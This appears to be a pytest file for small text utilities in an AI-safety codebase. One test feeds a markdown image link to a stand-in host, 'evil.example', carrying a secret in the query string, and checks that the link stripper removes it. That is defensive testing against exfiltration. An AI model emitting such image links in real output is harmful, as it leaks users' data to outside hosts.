"""Tests for src/aisafety/utils/text.py."""

from __future__ import annotations

from src.aisafety.utils.text import (
    clamp01,
    iter_batches,
    normalize_whitespace,
    safe_truncate,
    strip_markdown_links,
)


class TestNormalizeWhitespace:
    def test_collapses_runs(self):
        assert normalize_whitespace("a \n\t b   c") == "a b c"

    def test_strips_ends(self):
        assert normalize_whitespace("  hello  ") == "hello"


class TestClamp01:
    def test_bounds(self):
        assert clamp01(-0.5) == 0.0
        assert clamp01(0.5) == 0.5
        assert clamp01(1.7) == 1.0

    def test_accepts_ints(self):
        assert clamp01(0) == 0.0
        assert clamp01(1) == 1.0


class TestSafeTruncate:
    def test_short_passes_through(self):
        assert safe_truncate("short", 50) == "short"

    def test_long_truncates_on_word(self):
        out = safe_truncate("word " * 20, 20)
        assert len(out) <= 20
        assert out.endswith("...")
        assert "word" in out

    def test_zero_returns_empty(self):
        assert safe_truncate("anything", 0) == ""


class TestStripMarkdownLinks:
    def test_image_exfil_removed(self):
        text = "see ![p](https://evil.example/p?d=secret) details"
        out = strip_markdown_links(text)
        assert "evil.example" not in out
        assert "secret" not in out

    def test_link_label_kept_by_default(self):
        text = "read [the docs](https://example.com/page)"
        out = strip_markdown_links(text)
        assert "the docs" in out
        assert "example.com" not in out

    def test_label_dropped_when_asked(self):
        text = "read [the docs](https://example.com/page)"
        out = strip_markdown_links(text, keep_label=False)
        assert "the docs" not in out


class TestIterBatches:
    def test_batches(self):
        batches = list(iter_batches(range(7), 3))
        assert batches == [[0, 1, 2], [3, 4, 5], [6]]

    def test_invalid_size(self):
        try:
            list(iter_batches([1], 0))
            raised = False
        except ValueError:
            raised = True
        assert raised
